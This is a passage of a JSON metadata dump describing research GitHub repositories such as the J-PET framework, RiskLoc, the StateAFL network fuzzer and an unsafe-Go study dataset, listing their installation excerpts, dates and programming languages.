                "source": "https://raw.githubusercontent.com/iSEngLab/AwesomeLearningAPR/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-12-18T09:46:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T12:06:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "729": {
        "filename": "JPETTomography_j-pet-framework_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JPETTomography/j-pet-framework",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installation\n\n## Basic steps\n\n1. Install the required libraries and tools.  \n   Refer to the `Requirements` section of this document for details.  \n   You can find ready commands for some systems in the `Requirements installation` section.\n\n2. Create a directory where the built programs will be placed, e.g. in the main directory:  \n   `mkdir build`  \n   `cd build`\n\n3. Invoke the CMake build tool and provide the path to the source directory as well as path to install.\n   If you created the build directory in the main one and entered `build` as in step 2. then do:  \n   `cmake -DCMAKE_INSTALL_PREFIX=<install_path> ..`\n   If you didn't install Unpacker2 globally on the system also provide path to Unpacker2_DIR:\n   `cmake -DCMAKE_INSTALL_PREFIX=<install_path> -DUnpacker2_DIR=<path_to_unpacker2> ..`\n\n4. To compile the J-PET Framework Library do:  \n   `make`\n\n5. Once the compilation is finished, you can run tests with:\n   `ctest`\n   or install libraries in <install_path> using:\n   `make install`\n\n**NOTE:** Full install procedure with tips and troubleshootung can be found on [PetWiki](http://koza.if.uj.edu.pl/petwiki/index.php/Installing_the_J-PET_Framework_on_Ubuntu)\n\n\n## Code documentation\n\nTo generate the code documentation of the J-PET Framework library, the Doxygen software must be installed.\nTo generate the documentation just go to the j-pet-framework build directory and do:\n```\nmake documentation\n```\nand the documentation will be generated and put in folders named latex and html inside the build directory.\n\n\n## Requirements\n1. gcc\n\n2. [cmake](https://cmake.org/)\n\n3. [ROOT](http://root.cern.ch)  \n   Works with ROOT 6 (tested 6.10/08)\n\n4. [BOOST](https://www.boost.org/)\n\n5. [Unpacker2](https://github.com/JPETTomography/Unpacker2)\n\n6. (Optional)To generate documentation: [Doxygen](www.doxygen.org)\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/JPETTomography/j-pet-framework/master/INSTALL.md"
            },
            {
                "result": {
                    "value": "Please see the file called [INSTALL](INSTALL.md).\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "J-PET Analysis Framework"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/JPETTomography/j-pet-framework/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The latest stable version can be downloaded from the github repository. You must have git client installed and do:\n```\ngit clone https://github.com/JPETTomography/j-pet-framework.git myFramework\n```\n \n",
                    "original_header": "Latest Version"
                },
                "confidence": 0.9999999999999716,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JPETTomography/j-pet-framework/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-06-17T17:17:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-13T10:20:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 976591
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 34854
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 25987
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 14686
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 4679
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "730": {
        "filename": "RGAI-USZ_JS-patch-exploration-APR2021_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/AAI-USZ/JS-patch-exploration-APR2021",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-03-11T06:39:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-05-12T10:24:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 4526935
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3271
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "731": {
        "filename": "yusufsn_EclipseForumData_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yusufsn/EclipseForumData",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-07-02T02:59:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-10-14T06:25:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "732": {
        "filename": "marcofavorito_tl-grammars_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/marcofavorito/tl-grammars",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Link to the latest version on GitHub: https://marcofavorito.me/tl-grammars \n",
                    "original_header": "Standard Grammar for Temporal Logics"
                },
                "confidence": 0.9976685088982004,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/marcofavorito/tl-grammars/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The easiest way to run Manubot is to use [continuous integration](#continuous-integration) to rebuild the manuscript when the content changes.\nIf you want to build a Manubot manuscript locally, install the [conda](https://conda.io) environment as described in [`build`](build).\nThen, you can build the manuscript on POSIX systems by running the following commands from this root directory.\n```sh\n# Activate the manubot conda environment (assumes conda version >= 4.4)\nconda activate manubot\n\n# Build the manuscript, saving outputs to the output directory\nbash build/build.sh\n\n# At this point, the HTML & PDF outputs will have been created. The remaining\n# commands are for serving the webpage to view the HTML manuscript locally.\n# This is required to view local images in the HTML output.\n\n# Configure the webpage directory\nmanubot webpage\n\n# You can now open the manuscript webpage/index.html in a web browser.\n# Alternatively, open a local webserver at http://localhost:8000/ with the\n# following commands.\ncd webpage\npython -m http.server\n```\nSometimes it's helpful to monitor the content directory and automatically rebuild the manuscript when a change is detected.\nThe following command, while running, will trigger both the `build.sh` script and `manubot webpage` command upon content changes:\n```sh\nbash build/autobuild.sh\n```\n \n",
                    "original_header": "Local execution"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/marcofavorito/tl-grammars/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Whenever a pull request is opened, CI (continuous integration) will test whether the changes break the build process to generate a formatted manuscript.\nThe build process aims to detect common errors, such as invalid citations.\nIf your pull request build fails, see the CI logs for the cause of failure and revise your pull request accordingly. \n+ **HTML manuscript** at https://marcofavorito.github.io/tl-grammars/\n+ **PDF manuscript** at https://marcofavorito.github.io/tl-grammars/manuscript.pdf \nFor continuous integration configuration details, see [`.github/workflows/manubot.yaml`](.github/workflows/manubot.yaml) if using GitHub Actions or [`.travis.yml`](.travis.yml) if using Travis CI.\n \n",
                    "original_header": "Continuous Integration"
                },
                "confidence": 0.9985658757261029,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/marcofavorito/tl-grammars/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-12-20T18:21:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-05T01:02:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 174176
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 93018
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 13829
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 13611
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ANTLR",
                    "name": "ANTLR",
                    "type": "Programming_language",
                    "size": 3373
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "733": {
        "filename": "wnr_element-resize-detector_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wnr/element-resize-detector",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Removes all listeners from the element, but does not completely remove the detector. Use this function if you may add listeners later and don't want the detector to have to initialize again.\n \n",
                    "original_header": "removeAllListeners(element)"
                },
                "confidence": 0.9949292483136842,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/wnr/element-resize-detector/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-01-27T12:22:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T13:31:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 108147
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 767
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "734": {
        "filename": "shaido987_riskloc_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/shaido987/riskloc",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n  <img width=\"736\" alt=\"architecture\" src=\"https://github.com/shaido987/riskloc/assets/1130029/c9b8d791-ac94-4edc-b70f-8555467b6c2a\">\n</p> \n",
                    "original_header": "RiskLoc"
                },
                "confidence": 0.9964886474446542,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shaido987/riskloc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "They can be run by specifying the algorithm name as the first input parameter to the `run.py` file:\n```\n$ python run.py --help\nusage: run.py [-h] {riskloc,autoroot,squeeze,old squeeze,hotspot,r_adtributor,adtributor} ...\n\nRiskLoc\n\npositional arguments: {riskloc,autoroot,robustspot,squeeze,hotspot,r_adtributor,adtributor}\n\n                        algorithm specific help\n    riskloc             riskloc help\n    autoroot            autoroot help\n    robustspot          robustspot help\n    squeeze             squeeze help\n    hotspot             autoroot help\n    r_adtributor        r_adtributor help\n    adtributor          adtributor help\n\noptional arguments:\n  -h, --help            show this help message and exit\n```\nThe code for Squeeze is adapted from the released code from the original publication: https://github.com/NetManAIOps/Squeeze.\nThe code for RobustSpot is similarly adapted from their recently released code: https://github.com/robustspotproject/RobustSpot. \n",
                    "original_header": "Algorithms"
                },
                "confidence": 0.9999998997544758,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shaido987/riskloc/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The semi-synthetic datasets can be downloaded from: https://github.com/NetManAIOps/Squeeze.\nTo run these, place them within the data/ directory and name them: A, B0, B1, B2, B3, B4, and D, respectively. \n",
                    "original_header": "Datasets"
                },
                "confidence": 0.9992713884070135,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shaido987/riskloc/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-23T05:54:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T02:12:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 132837
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "735": {
        "filename": "SNTSVV_DAMAT_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SNTSVV/DAMAT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "A tutorial for DAMAT is avalable at https://github.com/SNTSVV/DAMAT_Tutorial. \n",
                    "original_header": "DAMAT: Data-driven Mutation Analysis for Cyber-Physical Systems"
                },
                "confidence": 0.9893206190721306,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SNTSVV/DAMAT/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-20T09:54:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-09-20T15:04:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 104263
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 58580
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 52856
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "736": {
        "filename": "mwshinn_paranoidscientist_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mwshinn/paranoidscientist",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2017-12-04T02:00:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-05T10:24:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 87866
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 101
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "737": {
        "filename": "stateafl_stateafl_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/stateafl/stateafl",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Download StateAFL and compile it. We have tested StateAFL on Ubuntu 18.04 and Ubuntu 16.04 64-bit and it would also work on all environments that support the vanilla AFL and [graphviz](https://graphviz.org).\n\n```bash\n# First, clone this StateAFL repository to a folder named stateafl\ngit clone <links to the repository> stateafl\n# Then move to the source code folder\ncd stateafl\nmake clean all\ncd llvm_mode\n# The following make command may not work if llvm-config cannot be found\n# To fix this issue, just set the LLVM_CONFIG env. variable to the specific llvm-config version on your machine\n# On Ubuntu 18.04, it could be llvm-config-6.0 if you have installed clang using apt-get\nmake\n# Move to StateAFL's parent folder\ncd ../..\nexport STATEAFL=$(pwd)/stateafl\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "StateAFL",
                    "parent_header": [
                        "Installation (Tested on Ubuntu 18.04 &amp; 16.04 64-bit)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stateafl/stateafl/main/README.md"
            },
            {
                "result": {
                    "value": "```bash\nexport PATH=$STATEAFL:$PATH\nexport AFL_PATH=$STATEAFL\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup PATH environment variables",
                    "parent_header": [
                        "Installation (Tested on Ubuntu 18.04 &amp; 16.04 64-bit)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stateafl/stateafl/main/README.md"
            },
            {
                "result": {
                    "value": "StateAFL takes in input seed files in \"replayable\" format. It is a simple format also used in AFLNet for replaying inputs (i.e., the ones saves in `replayable-queue` and `replayable-crashes` within the output folder), using the command `aflnet-replay`. The format alternates the size of a message (4 bytes, unsigned int) and the contents of that message.\n\n![Network replay format](images/replay-format.png)\n\nYou can automatically generate seed files from PCAP traces, as follows:\n\n```bash\n$ python3 convert-pcap-replay-format.py --input ftp_requests_full_normal.pcap --server-port 2200 --output ftp_requests_full_normal.replay\n\nWriting 13 bytes...\nWriting 13 bytes...\nWriting 6 bytes...\nWriting 5 bytes...\nWriting 24 bytes...\nWriting 6 bytes...\nWriting 10 bytes...\nWriting 6 bytes...\nConverted PCAP saved to ftp_requests_full_normal.replay\n\n$ hexdump -C ftp_requests_full_normal.replay\n\n00000000  0d 00 00 00 55 53 45 52  20 75 62 75 6e 74 75 0d  |....USER ubuntu.|\n00000010  0a 0d 00 00 00 50 41 53  53 20 75 62 75 6e 74 75  |.....PASS ubuntu|\n00000020  0d 0a 06 00 00 00 53 59  53 54 0d 0a 05 00 00 00  |......SYST......|\n00000030  50 57 44 0d 0a 18 00 00  00 50 4f 52 54 20 31 32  |PWD......PORT 12|\n00000040  37 2c 30 2c 30 2c 31 2c  31 33 32 2c 32 30 39 0d  |7,0,0,1,132,209.|\n00000050  0a 06 00 00 00 4c 49 53  54 0d 0a 0a 00 00 00 4d  |.....LIST......M|\n00000060  4b 44 20 74 65 73 74 0d  0a 06 00 00 00 51 55 49  |KD test......QUI|\n00000070  54 0d 0a                                          |T..|\n00000073\n```\n\nThe PCAP file should only contain one message flow between the server and a client. Both TCP and UDP are supported. If the PCAP contains multiple message flows, you can use the options `--client-port` and `--ignore-multiple-clients` to pick a specific flow and ignore the others. To run the conversion script, you need to install the [pyshark](https://github.com/KimiNewt/pyshark) Python package, and the [tshark](https://tshark.dev/) tool. It is **not required** that the protocol under test can be parsed by tshark. The script only extracts the raw payload from TCP or UDP traffic.\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparing the seed inputs"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stateafl/stateafl/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-10-12T16:26:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T06:47:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 690886
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 35207
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 27185
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 15220
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 5142
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3607
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 3475
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "738": {
        "filename": "stg-tud_unsafe_go_study_results_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/stg-tud/unsafe_go_study_results",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.4130780.svg)](https://zenodo.org/record/4130780)\n\nThis is the data set and scripts for our paper \"Uncovering the Hidden Dangers: Finding Unsafe Go Code in the Wild\".\n\n**Authors:**  \nJohannes Lauinger, Lars Baumg\u00e4rtner, Anna-Katharina Wickert, and Mira Mezini  \nTechnische Universit\u00e4t Darmstadt, D-64289 Darmstadt, Germany  \nE-mail: {baumgaertner, wickert, mezini} (with) cs.tu-darmstadt.de, jlauinger (with) seemoo.tu-darmstadt.de\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Data Set: Finding Unsafe Go Code in the Wild"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stg-tud/unsafe_go_study_results/master/README.md"
            },
            {
                "result": {
                    "value": "To create and process the data for our study, we used the following pipeline:\n\n 1. **Raw Projects and Dependencies.** This set contains the 500 open-source Go projects that we crawled from GitHub.\n    The projects at the specific revision that we examined are referenced in this repository through Git submodules.\n    The `projects/` directory contains the submodules.\n 2. **Package and Unsafe Data.** From the projects and their dependencies, we compiled the list of all packages used\n    transitively. Within all packages, we identified usages of `unsafe` Go code. The results of this stage are\n    included in the `data/` directory.\n 3. **Labeled Unsafe Usages.** We used Python to examine the data and sample 1,400 code snippets for manual classification by unsafe usage type\n    and purpose. The results of this stage are included in the `analysis/` and `labeled-usages-dataset/` directories.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Research pipeline",
                    "parent_header": [
                        "Data Set: Finding Unsafe Go Code in the Wild"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stg-tud/unsafe_go_study_results/master/README.md"
            },
            {
                "result": {
                    "value": "The directories in this repository contain the following:\n\n - `data/` contains gzipped versions of the CSV files holding project, package, and unsafe code block information,\n   as well as the sampled and labeled code snippets.\n - `figures/` contains Figures 1 to 5 as included in our paper.\n - `labeled-usages-dataset/` contains our data set of labaled usages of unsafe code blocks in Go code. The data set\n   is divided into 400 Go standard library usages (*std*) and 1,000 application code (non-standard library) usages\n   (app). Each directory contains subfolders with names similar to `efficiency__cast-struct`, where the purpose\n   label and usage label as used in our paper are included, separated by two underscores. Each of the directories\n   contains one file for each classified usage, as described in more detail below.\n - `projects/` contains Git submodules for each of the 500 projects under examination, set to the specific revision\n   that we analyzed.\n - `scripts/` contains Python scripts to replicate the figures and tables included in our paper, as well as the\n   data acquisition tool that we used to extract unsafe code blocks from the projects and a Jupyter notebook with\n   the Python code that we used to explore the data.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Directory structure",
                    "parent_header": [
                        "Data Set: Finding Unsafe Go Code in the Wild"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stg-tud/unsafe_go_study_results/master/README.md"
            },
            {
                "result": {
                    "value": "The `data/geiger_findings.csv.gz` file contains the unsafe code findings. Each line in the file represents one\nfinding. It holds the corresponding code line, as +/- 5 lines of code context, as well as meta data about the finding.\nThis meta data includes the line number, column, file, package, module, and project where it was found. Package and\nproject data is a foreign key to the `data/packages.csv.gz` and `data/projects.csv.gz` files, respectively,\nwhich provide more detailed information. For example, the packages file contains total finding counts for each\npackage.\n\nThe `data/vet_findings.csv.gz` and `data/gosec_findings.csv.gz` contain warnings that were generated by `go vet` and\n`gosec` on the packages.\n\nThe `data/` directory also contains the `sampled_usages_app.csv.gz` and `sampled_usages_std.csv.gz` files, which are\nsamples subsets of the `geiger_findings.csv.gz` file containing 1,000 and 400 unique samples together with two\nlabels for each line.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Data: unsafe code blocks",
                    "parent_header": [
                        "Data Set: Finding Unsafe Go Code in the Wild"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stg-tud/unsafe_go_study_results/master/README.md"
            },
            {
                "result": {
                    "value": "As described in our paper, we randomly sampled 1,400 unique unsafe usages from the 10 projects with the most overall\nunsafe usages. We then manually classified these samples in two dimensions: by what is being done and for what purpose.\n\nWe identified the following classes for the first dimension, what is being done:\n\n - `cast-struct`, `cast-basic`, `cast-bytes`, `cast-pointer`, `cast-header` (all summarized as `cast` in our paper to\n   save space): all kinds of casts between arbitrary types and structs, basic Go types, `[]byte` slices or `[N]byte`\n   arrays, actual `unsafe.Pointer` values, or `reflect.SliceHeader` and `reflect.StringHeader` values, respectively.\n - `memory-access`: dereferencing of unsafe pointers, manipulation of referenced memory, or comparison of the actual\n   stored addresses.\n - `pointer-arithmetic`: all kinds of arithmetic manipulation of addresses, such as manually advancing a slice.\n - `definition`: groups usages where a field or method of type `unsafe.Pointer` is declared for later usage.\n - `delegate`: instances where unsafe is needed only because another function requires an argument of type `unsafe.Pointer`.\n - `syscall`: groups calls to `syscall.Syscall` or other native syscalls.\n - `unused`: occurences that are not actually being used, e.g. dead code or unused function parameters.\n\nPurpose of usage is labeled with the following classes:\n\n - `efficiency`: all uses of unsafe to improve time or space complexity, such as in-place casts. Code contained in this class could also be written\n   without the use of unsafe, decreasing effeciency.\n - `serialization`: contains marshalling and serialization operations.\n - `generics`: contains usages of unsafe that achieve functionality that could have been written without unsafe if Go provided\n   support for generics.\n - `no-gc` (avoid garbage collection): contains usages where unsafe is used to tell the compiler to not free a value until\n   a function returns, such as when calling assembly code.\n - `atomic` (atomic operations): contains usages of the atomic package which require unsafe.\n - `ffi` (foreign function interface): contains calls to Cgo or other function interfaces that require unsafe by their contract.\n - `hide-escape`: contains snippets where unsafe is used to hide a value from Go escape analysis.\n - `layout` (memory layout control): contains unsafe usages to achieve low-level memory management, such as precise alignment.\n - `types`: contains unsafe usages needed to implement the Go type system itself. Only present in the `std` samples.\n - `reflect`: contains instances of type reflection and re-implementations of some types from the reflect package,\n   such as using `unsafe.Pointer` instead of `uintptr` for slice headers.\n - `unused`: again, contains occurences that are not actually being used.\n\nThe `labeled-usages-dataset` is organized as follows: the `app` and `std` contain 1,000 and 400 samples, respectively, divided by\napplication (non-standard libraries) and standard-library usages. Each of them contains subdirectories grouping the snippets by\ntheir combination of labels. The subdirectories are named similar to `efficiency__cast-struct`. Both labels of the samples are\nconcatenated using two underscores. Every combination of labels that actually contains samples has its own directory.\n\nThe samples are provided as one file for each sample. The file name is a hash of line number, file, package etc. of the finding,\nproviding a guaranteed unique name. The files contain 4 sections divided by dashes. The first section provides information\nabout the module, version, package, file, and line of the snippet. It also states which project included this snippet (but\nthere can be more projects in the data set that share usage of the snippet), and the labels as already included in the directory\nname. The information is guaranteed to be in the same line number across files. The second section contains the snippet\ncode line. The third and fourth section contain a +/- 5 lines and +/- 100 lines context, respectively.\n\nAdditionally, the labaled data set is included in machine-readable CSV format in the `data/sampled_usages_app.csv.gz` and\n`data/sampled_usaged_std.csv.gz` as described previously.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Labeled data set of unsafe usages in the wild",
                    "parent_header": [
                        "Data Set: Finding Unsafe Go Code in the Wild"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stg-tud/unsafe_go_study_results/master/README.md"
            },
            {
                "result": {
